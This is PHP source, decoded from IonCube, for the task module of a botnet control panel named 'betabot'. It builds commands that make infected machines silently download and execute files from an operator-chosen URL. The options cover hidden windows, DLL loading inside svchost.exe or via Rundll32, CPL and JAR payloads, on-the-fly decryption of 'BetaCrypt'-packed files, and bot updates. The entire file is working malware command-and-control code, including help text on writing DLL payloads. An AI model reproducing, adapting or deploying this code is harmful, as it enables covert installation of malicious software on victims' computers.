<?php
/*
 * @ https://EasyToYou.eu - IonCube v10 Decoder Online
 * @ PHP 5.6
 * @ Decoder version: 1.0.4
 * @ Release: 02/06/2020
 *
 * @ ZendGuard Decoder PHP 5.6
 */

echo "\t\t\t\t";
if (!defined("IN_TASKS_MODULE")) {
    exit("..");
}
$fs_select = isset($_POST["cmd_dwfile_file_type"]) ? $_POST["cmd_dwfile_file_type"] : "";
$task_download_edit__dll_export = "";
if (!isset($_TASK_FILE_UI_ONLY)) {
    define("TASKS_DOWNLOAD_ERROR_URL_REQUIRED", "A valid URL is required.");
    define("TASKS_DOWNLOAD_ERROR_URL_INVALID", "Invalid URL specified. Please provide a valid, non-Unicode URL to use for this task.");
    define("TASKS_DOWNLOAD_ERROR_URL_NO_HTTPS", "SSL download links are not currently supported.");
    define("TASKS_DOWNLOAD_ERROR_URL_TOO_LONG", "The URL you specified was too long. Please use a URL no longer than 460 characters long (ANSI).");
    define("TASKS_DOWNLOAD_ERROR_STRANGE_COMMAND", "What a strange command you have there.");
    define("TASKS_DOWNLOAD_ERROR_JAR_NO_DECRYPT", "The decrypt option is not supported with file type JAR.");
    define("TASKS_DOWNLOAD_ERROR_DLL_EXPORT_ERROR", "The option 'Run DLL using Rundll32.exe' was selected, but no exported function name was provided. You must provide the name of a function that this DLL exports so that Rundll32 may call that function upon loading the DLL. The function name length must be between 1 - 24 characters.");
    if (!isset($_POST["cmd_dwfile_url"]) || strlen($_POST["cmd_dwfile_url"]) < 4 || strcasecmp($_POST["cmd_dwfile_url"], "http://") == 0) {
        $_TASK_FILE_UI_FIELD_ERRORS["field_1"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_DOWNLOAD_ERROR_URL_REQUIRED, true, MOD_TASKS_ALERT_WIDTH);
    } else {
        if (stripos($_POST["cmd_dwfile_url"], "https://") === 0) {
            $_TASK_FILE_UI_FIELD_ERRORS["field_1"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_DOWNLOAD_ERROR_URL_NO_HTTPS, true, MOD_TASKS_ALERT_WIDTH);
        } else {
            if (isset($_POST["cmd_dwfile_use_rundll"]) && (!isset($_POST["cmd_dwfile_dllexport"]) || strlen($_POST["cmd_dwfile_dllexport"]) == 0 || 24 < strlen($_POST["cmd_dwfile_dllexport"]) || !ctype_alnum($_POST["cmd_dwfile_dllexport"]))) {
                $_TASK_FILE_UI_FIELD_ERRORS["field_2"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_DOWNLOAD_ERROR_DLL_EXPORT_ERROR, true, MOD_TASKS_ALERT_WIDTH);
            } else {
                if (!isset($_POST["cmd_command"]) || $_POST["cmd_command"] != "update" && $_POST["cmd_command"] != "dwfile") {
                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_DOWNLOAD_ERROR_STRANGE_COMMAND, true, MOD_TASKS_ALERT_WIDTH);
                } else {
                    $b_no_crypt_option = false;
                    $b_is_invalid = false;
                    $url_array = @str_split($_POST["cmd_dwfile_url"]);
                    for ($i = 0; $i < strlen($_POST["cmd_dwfile_url"]); $i++) {
                        if (ord($url_array[$i]) < 32 || 168 < ord($url_array[$i])) {
                            $b_is_invalid = true;
                            break;
                        }
                    }
                    if ($b_is_invalid == true || !strstr($_POST["cmd_dwfile_url"], ".")) {
                        $_TASK_FILE_UI_FIELD_ERRORS["field_1"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_DOWNLOAD_ERROR_URL_INVALID, true, MOD_TASKS_ALERT_WIDTH);
                    } else {
                        if (460 < strlen($_POST["cmd_dwfile_url"])) {
                            $_TASK_FILE_UI_FIELD_ERRORS["field_1"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_DOWNLOAD_ERROR_URL_TOO_LONG, true, MOD_TASKS_ALERT_WIDTH);
                        } else {
                            $e_cmd_switches = COMMAND_GENERAL_SWITCH_SILENT . COMMAND_DOWNLOAD_SWITCH_EXECUTE;
                            if (isset($_POST["cmd_dwfile_rand_wait"])) {
                                $e_cmd_switches .= COMMAND_DOWNLOAD_SWITCH_RANDOM_WAIT;
                            }
                            if (isset($_POST["cmd_dwfile_update_hash_check"])) {
                                $e_cmd_switches .= COMMAND_DOWNLOAD_SWITCH_UPDATE_HASH_CHECK;
                            }
                            if (isset($_POST["cmd_dwfile_update_is_same"])) {
                                $e_cmd_switches .= COMMAND_DOWNLOAD_SWITCH_UPDATE_IS_SAME_BOT;
                            }
                            if (isset($_POST["cmd_dwfile_update_is_same_revert_to_standard_if_fail"])) {
                                $e_cmd_switches .= COMMAND_DOWNLOAD_SWITCH_UPDATE_REVERT_TO_STANDARD;
                            }
                            if (isset($_POST["cmd_dwfile_hide_window"])) {
                                $e_cmd_switches .= COMMAND_DOWNLOAD_SWITCH_HIDE_WINDOW;
                            }
                            if (isset($_POST["cmd_dwfile_auto_remove"])) {
                                $e_cmd_switches .= COMMAND_DOWNLOAD_SWITCH_AUTO_REMOVE;
                            }
                            if (isset($_POST["cmd_dwfile_no_proactive"])) {
                                $e_cmd_switches .= COMMAND_DOWNLOAD_SWITCH_NO_PROACTIVE;
                            }
                            if (isset($_POST["cmd_dwfile_use_cache_writefile"])) {
                                $e_cmd_switches .= COMMAND_DOWNLOAD_SWITCH_USE_CACHE_WRITE;
                            }
                            if (isset($_POST["cmd_dwfile_file_type"]) && $_POST["cmd_dwfile_file_type"] == "dll") {
                                $e_cmd_switches .= COMMAND_DOWNLOAD_SWITCH_IS_DLL_FILE;
                            }
                            if (isset($_POST["cmd_dwfile_file_type"]) && $_POST["cmd_dwfile_file_type"] == "jar") {
                                $b_no_crypt_option = true;
                                $e_cmd_switches .= COMMAND_DOWNLOAD_SWITCH_IS_JAR_FILE;
                            }
                            if (isset($_POST["cmd_dwfile_file_type"]) && $_POST["cmd_dwfile_file_type"] == "cpl") {
                                $b_no_crypt_option = true;
                                $e_cmd_switches .= COMMAND_DOWNLOAD_SWITCH_IS_CPL_FILE;
                            }
                            if ($b_no_crypt_option == true) {
                                if (isset($_POST["cmd_dwfile_decrypt"])) {
                                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_DOWNLOAD_ERROR_JAR_NO_DECRYPT, true, MOD_TASKS_ALERT_WIDTH);
                                }
                            } else {
                                if (isset($_POST["cmd_dwfile_decrypt"])) {
                                    $e_cmd_switches .= COMMAND_DOWNLOAD_SWITCH_DECRYPT;
                                }
                            }
                            if (isset($_POST["cmd_dwfile_use_rundll"])) {
                                $e_cmd_switches .= COMMAND_DOWNLOAD_SWITCH_USE_RUNDLL;
                            }
                            $_TASK_FILE_SQL_TASK_TYPE = $_POST["cmd_command"] == "update" ? TASK_TYPE_UPDATE : TASK_TYPE_DOWNLOAD;
                            $_TASK_COMMAND_STRING = sprintf(COMMAND_FORMAT_DOWNLOAD, $_POST["cmd_command"] == "update" ? COMMAND_STRING_UPDATE : COMMAND_STRING_DOWNLOAD, $e_cmd_switches, $_POST["cmd_dwfile_url"]);
                            if (isset($_POST["cmd_dwfile_use_rundll"])) {
                                $_TASK_COMMAND_STRING = rtrim($_TASK_COMMAND_STRING, " ");
                                $_TASK_COMMAND_STRING .= " " . $_POST["cmd_dwfile_dllexport"];
                            }
                        }
                    }
                }
            }
        }
    }
    $asdf = 0;
} else {
    $cmd_command_id = "";
    $cmd_header = "";
    if (isset($_GET["s"])) {
        if ($_GET["s"] == "update") {
            $cmd_header = "Update bot options";
            $cmd_command_id = "update";
        }
    } else {
        $cmd_header = "Download file options";
        $cmd_command_id = "dwfile";
    }
    if (0 < strlen($cmd_command_id)) {
        $task_download_checkbox_random_wait = "checked";
        $task_download_checkbox_hide_window = "checked";
        $task_download_checkbox_auto_remove = "";
        $task_download_checkbox_sandbox = "";
        $task_download_checkbox_no_proactive = "";
        $task_download_checkbox_update_hash = "checked";
        $task_download_checkbox_update_is_same = "";
        $task_download_checkbox_update_revert_stand = "";
        $task_download_checkbox_decrypt = "";
        $task_download_checkbox_use_rundll = "";
        $task_download_checkbox_use_cache_writefile = "checked";
        if (0 < strlen($e_task_cmd_string)) {
            $task_download_splits = @explode(" ", $e_task_cmd_string);
            list($task_download_edit__switches, $task_download_edit__url, $task_download_edit__dll_export) = $task_download_splits;
            if (strstr($task_download_edit__switches, COMMAND_DOWNLOAD_SWITCH_IS_DLL_FILE) && isset($task_download_splits[3])) {
                $task_download_edit__dll_export = $task_download_splits[3];
            }
            if (strstr($task_download_edit__switches, COMMAND_DOWNLOAD_SWITCH_RANDOM_WAIT)) {
                $task_download_checkbox_random_wait = "checked";
            } else {
                $task_download_checkbox_random_wait = "";
            }
            if (strstr($task_download_edit__switches, COMMAND_DOWNLOAD_SWITCH_UPDATE_HASH_CHECK)) {
                $task_download_checkbox_update_hash = "checked";
            } else {
                $task_download_checkbox_update_hash = "";
            }
            if (strstr($task_download_edit__switches, COMMAND_DOWNLOAD_SWITCH_UPDATE_IS_SAME_BOT)) {
                $task_download_checkbox_update_is_same = "checked";
            } else {
                $task_download_checkbox_update_is_same = "";
            }
            if (strstr($task_download_edit__switches, COMMAND_DOWNLOAD_SWITCH_UPDATE_REVERT_TO_STANDARD)) {
                $task_download_checkbox_update_revert_stand = "checked";
            } else {
                $task_download_checkbox_update_revert_stand = "";
            }
            if (strstr($task_download_edit__switches, COMMAND_DOWNLOAD_SWITCH_HIDE_WINDOW)) {
                $task_download_checkbox_hide_window = "checked";
            } else {
                $task_download_checkbox_hide_window = "";
            }
            if (strstr($task_download_edit__switches, COMMAND_DOWNLOAD_SWITCH_AUTO_REMOVE)) {
                $task_download_checkbox_auto_remove = "checked";
            } else {
                $task_download_checkbox_auto_remove = "";
            }
            if (strstr($task_download_edit__switches, COMMAND_DOWNLOAD_SWITCH_SANDBOX)) {
                $task_download_checkbox_sandbox = "checked";
            }
            if (strstr($task_download_edit__switches, COMMAND_DOWNLOAD_SWITCH_NO_PROACTIVE)) {
                $task_download_checkbox_no_proactive = "checked";
            }
            if (strstr($task_download_edit__switches, COMMAND_DOWNLOAD_SWITCH_USE_CACHE_WRITE)) {
                $task_download_checkbox_use_cache_writefile = "checked";
            } else {
                $task_download_checkbox_use_cache_writefile = "";
            }
            if (strstr($task_download_edit__switches, COMMAND_DOWNLOAD_SWITCH_IS_DLL_FILE)) {
                $fs_select = "dll";
            }
            if (strstr($task_download_edit__switches, COMMAND_DOWNLOAD_SWITCH_IS_JAR_FILE)) {
                $fs_select = "jar";
            }
            if (strstr($task_download_edit__switches, COMMAND_DOWNLOAD_SWITCH_IS_CPL_FILE)) {
                $fs_select = "cpl";
            }
            if (strstr($task_download_edit__switches, COMMAND_DOWNLOAD_SWITCH_DECRYPT)) {
                $task_download_checkbox_decrypt = "checked";
            } else {
                $task_download_checkbox_decrypt = "";
            }
            if (strstr($task_download_edit__switches, COMMAND_DOWNLOAD_SWITCH_USE_RUNDLL)) {
                $task_download_checkbox_use_rundll = "checked";
            } else {
                $task_download_checkbox_use_rundll = "";
            }
        } else {
            $task_download_edit__switches = "";
            $task_download_edit__url = isset($_POST["cmd_dwfile_url"]) ? $_POST["cmd_dwfile_url"] : "http://";
            $task_download_edit__dll_export = isset($_POST["cmd_dwfile_dllexport"]) ? $_POST["cmd_dwfile_dllexport"] : "";
            if (isset($_POST["cmd_dwfile_rand_wait"])) {
                $task_download_checkbox_random_wait = "checked";
            }
            if (isset($_POST["cmd_dwfile_hide_window"])) {
                $task_download_checkbox_hide_window = "checked";
            }
            if (isset($_POST["cmd_dwfile_auto_remove"])) {
                $task_download_checkbox_auto_remove = "checked";
            }
            if (isset($_POST["cmd_dwfile_sandbox"])) {
                $task_download_checkbox_sandbox = "checked";
            }
            if (isset($_POST["cmd_dwfile_no_proactive"])) {
                $task_download_checkbox_no_proactive = "checked";
            }
            if (isset($_POST["cmd_dwfile_use_cache_writefile"])) {
                $task_download_checkbox_use_cache_writefile = "checked";
            }
            if (isset($_POST["cmd_dwfile_decrypt"])) {
                $task_download_checkbox_decrypt = "checked";
            }
            if (isset($_POST["cmd_dwfile_use_rundll"])) {
                $task_download_checkbox_use_rundll = "checked";
            }
        }
        echo "\t\t\t\t\r\n\t\t\t\t";
        _obfuscated_0D3C1605063C03152930040422062C0F0121150D5C0832_((string) $cmd_header, 17, "top: 0px; font-size: 10px; face: font-family: Tahoma;", "left: 2px");
        echo "\t\t\t\t<br />\r\n\t\t\t\t<span style=\"position: relative; top: -5px;\">\r\n\t\t\t\t<input type=\"hidden\" name=\"cmd_command\" value=\"";
        echo $cmd_command_id;
        echo "\">\r\n\t\t\t\t<table>\r\n\t\t\t\t\t<tbody>\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\r\n\t\t\t\t\t\t\t\t<span style=\"font-size: 11px; face: font-family: Tahoma; position: relative; top: -5px;\">File URL: &nbsp;&nbsp;&nbsp;</span>\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\r\n\t\t\t\t\t\t\t\t<input type=\"text\" class=\"span3\" name=\"cmd_dwfile_url\" value=\"";
        echo $task_download_edit__url;
        echo "\" style=\"position: relative; top: -1px; width: 700px; height: 10px; font-size: 10px; face: font-family: Tahoma; ";
        echo $_TASK_FILE_UI_FIELD_ERRORS["field_1"];
        echo "\">\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t</tbody>\r\n\t\t\t\t</table>\r\n\t\t\t  \r\n\t\t\t  \r\n\t\t\t   <br />\r\n\t\t\t   \r\n\t\t\t ";
        if ($cmd_command_id != "update") {
            echo "\t\t\t\t<span style=\"position: relative; top: -11px;\">\r\n\t\t\t\t<div class=\"control-group\">\r\n\t\t\t\t\t<label class=\"control-label\" for=\"cmd_dwfile_file_type\" style=\"font-size: 10px; face: font-family: Tahoma;\">File type &nbsp;( <a id=\"dw_filetype_tip\" rel=\"popover\" data-placement=\"bottom\" data-content=\"It is important you choose the right file type when performing a download task. If you choose the wrong type, the task could fail as the loading procedure could be incompatible.<br /><br /><strong>EXE/PIF</strong> - Will be run normally<br /><strong>DLL</strong> - DLL file will be dropped to disk, and loaded inside a remote svchost.exe signed process. Process will not exit until the DLL chooses to terminate the process.<br /><strong>JAR</strong> - Will only be able to be executed if Java is present on the system.<br /><strong>CPL</strong> - The file will be saved as a .cpl file and run using Rundll32.dll / Control_RunDLL shell command.\" data-original-title=\"File type information\" href=\"#\">Hover here for more information</a> ):</label>\r\n\t\t\t\t\t<div class=\"controls\">\r\n\t\t\t\t\t\t<select id=\"cmd_dwfile_file_type\" name=\"cmd_dwfile_file_type\" style=\"font-size: 10px; face: font-family: Tahoma; height: 25px;\">\r\n\t\t\t\t\t\t\t<option value=\"exe\">Executable File (.EXE, .PIF)</option>\r\n\t\t\t\t\t\t\t<option value=\"dll\" ";
            echo $fs_select == "dll" ? "selected" : "";
            echo ">Dynamic Link Library (.DLL)</option>\r\n\t\t\t\t\t\t\t<option value=\"jar\" ";
            echo $fs_select == "jar" ? "selected" : "";
            echo ">Java Archive File (.JAR)</option>\r\n\t\t\t\t\t\t\t<option value=\"cpl\" ";
            echo $fs_select == "cpl" ? "selected" : "";
            echo ">Control Panel Applet (.CPL)</option>\r\n\t\t\t\t\t\t</select>\r\n\t\t\t\t\t</div>\r\n\t\t\t\t</div>\r\n\t\t\t\t</span>\r\n\t\t\t";
        }
        echo "\t\t\t<span style=\"position: relative; top: -8px;\">\r\n\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 620px;\">\r\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_dwfile_rand_wait\" value=\"yes\" style=\"position: relative; top: -1px\" ";
        echo $task_download_checkbox_random_wait;
        echo ">\r\n                Random wait before download &nbsp;&nbsp;<i>(Bot will wait anywhere from 3 - 16 seconds before downloading to reduce stress on file host)</i>\r\n              </label>\r\n\t\t\t  ";
        if ($cmd_command_id != "update") {
            echo "\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 160px;\">\r\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_dwfile_hide_window\" value=\"yes\" style=\"position: relative; top: -1px\" ";
            echo $task_download_checkbox_hide_window;
            echo ">\r\n                Hide application window\r\n              </label>\r\n\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 310px;\">\r\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_dwfile_auto_remove\" value=\"yes\" style=\"position: relative; top: -1px\" ";
            echo $task_download_checkbox_auto_remove;
            echo ">\r\n                Automatically schedule downloaded file for deletion on reboot\r\n              </label>\r\n\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 760px;\">\r\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_dwfile_decrypt\" value=\"yes\" style=\"position: relative; top: -1px\" ";
            echo $task_download_checkbox_decrypt;
            echo ">\r\n                Decrypt file as it downloads &nbsp;&nbsp;<i>(Only works when obfuscated with BetaCrypt.exe - If it isn't, this option will corrupt the download! Only available for EXE files)</i>\r\n              </label>\r\n\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 760px;\">\r\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_dwfile_use_cache_writefile\" value=\"yes\" style=\"position: relative; top: -1px\" ";
            echo $task_download_checkbox_use_cache_writefile;
            echo ">\r\n                Cache file in memory and write entire buffer to the drop file in a single WriteFile call\r\n              </label>\r\n\t\t\t  <br>\r\n\t\t\t  <font style=\"font-size: 10px; face: font-family: Tahoma;\">\r\n\t\t\t\t<div style=\"position: relative; top: -4px\">\r\n\t\t\t\t\t<strong>If <i>General Proactive Defense</i> mode is enabled, you should select this option for your own download tasks</strong>\r\n\t\t\t\t</div>\r\n\t\t\t  </font>\r\n\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 650px;\">\r\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_dwfile_no_proactive\" value=\"yes\" style=\"position: relative; top: -1px\" ";
            echo $task_download_checkbox_no_proactive;
            echo ">\r\n                Disable proactive defense for this new process &nbsp;&nbsp;<i>(Disables defensive measures for this process and allows free access to system resources)</i>\r\n              </label>\r\n\t\t\t  <br />\r\n\t\t\t  <font style=\"font-size: 10px; face: font-family: Tahoma;\">\r\n\t\t\t\t<div style=\"position: relative; top: -4px\">\r\n\t\t\t\t\t<strong>Additional options for <i>DLL download/run</i>. <a id=\"dw_dlldrop_tip\" rel=\"popover\" data-placement=\"bottom\" data-content=\"In order for your DLL to be properly executed by Rundll32, you must code the library to export a function with a very specific prototype:<br /><br /><i>VOID __stdcall ExportedFunctionName(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);</i><br /><br />When the bot drops the DLL file to the hard drive and executes Rundll32.exe, your exported function will be called with no additional data. Additionally, you may execute code within DllMain as well.\" data-original-title=\"Requirements for using RunDll32 to execute DLL file\" href=\"#\">Hover here for more information</a></strong>\r\n\t\t\t\t</div>\r\n\t\t\t  </font>\r\n\t\t\t  <!--EntryPoint(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);-->\r\n\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 780px;\">\r\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_dwfile_use_rundll\" value=\"yes\" style=\"position: relative; top: -1px\" ";
            echo $task_download_checkbox_use_rundll;
            echo ">\r\n                Run DLL using Rundll32.exe &nbsp;&nbsp;<i>(This may give better execution rates for DLL download tasks, but the dropped DLL must export a function with a specific prototype)</i>\r\n              </label>\r\n\t\t\t\t<table style=\"position: relative; top: 5px;\">\r\n\t\t\t\t\t<tbody>\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\r\n\t\t\t\t\t\t\t\t<span style=\"font-size: 11px; face: font-family: Tahoma; position: relative; top: -5px;\">DLL Exported Function Name for Rundll32: &nbsp;&nbsp;&nbsp;</span>\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\r\n\t\t\t\t\t\t\t\t<input type=\"text\" class=\"span3\" name=\"cmd_dwfile_dllexport\" value=\"";
            echo $task_download_edit__dll_export;
            echo "\" style=\"position: relative; top: 1px; width: 200px; height: 10px; font-size: 10px; face: font-family: Tahoma; ";
            echo $_TASK_FILE_UI_FIELD_ERRORS["field_2"];
            echo "\">\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t</tbody>\r\n\t\t\t\t</table>\r\n\t\t\t  \r\n\t\t\t  ";
        } else {
            echo "\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 650px;\">\r\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_dwfile_update_is_same\" value=\"yes\" style=\"position: relative; top: -1px\" ";
            echo $task_download_checkbox_update_is_same;
            echo ">\r\n                This update is a new/re-crypted version of <strong>betabot</strong> &nbsp;&nbsp;<i>(If this is a betabot update for your own net, use this for a more reliable update)</i>\r\n              </label>\r\n\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 950px;\">\r\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_dwfile_update_is_same_revert_to_standard_if_fail\" value=\"yes\" style=\"position: relative; top: -1px\" ";
            echo $task_download_checkbox_update_revert_stand;
            echo ">\r\n\t\t\t\tIf &nbsp;<i>\"This update is a new/re-crypted version ...\"</i>&nbsp; option above is checked, select this option to have bot fall back to normal update method if it is unable to have the new build remove old build\r\n              </label>\r\n\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 550px;\">\r\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_dwfile_update_hash_check\" value=\"yes\" style=\"position: relative; top: -1px\" ";
            echo $task_download_checkbox_update_hash;
            echo ">\r\n                Ignore if SHA1 hash matches same as last update &nbsp;&nbsp;<i>(Bot will not install this update if it matches current running build)</i>\r\n              </label>\r\n\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 640px;\">\r\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_dwfile_decrypt\" value=\"yes\" style=\"position: relative; top: -1px\" ";
            echo $task_download_checkbox_decrypt;
            echo ">\r\n                Decrypt file as it downloads &nbsp;&nbsp;<i>(Only works when obfuscated with BetaCrypt.exe - If it isn't, this option will corrupt the download!)</i>\r\n              </label>\r\n\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 760px;\">\r\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_dwfile_use_cache_writefile\" value=\"yes\" style=\"position: relative; top: -1px\" ";
            echo $task_download_checkbox_use_cache_writefile;
            echo ">\r\n                Cache file in memory and write entire buffer to the drop file in a single WriteFile call\r\n              </label>\r\n\t\t\t  </span>\r\n\t\t\t  </span>\r\n\t\t\t  \r\n\t\t\t  ";
        }
    }
}

?>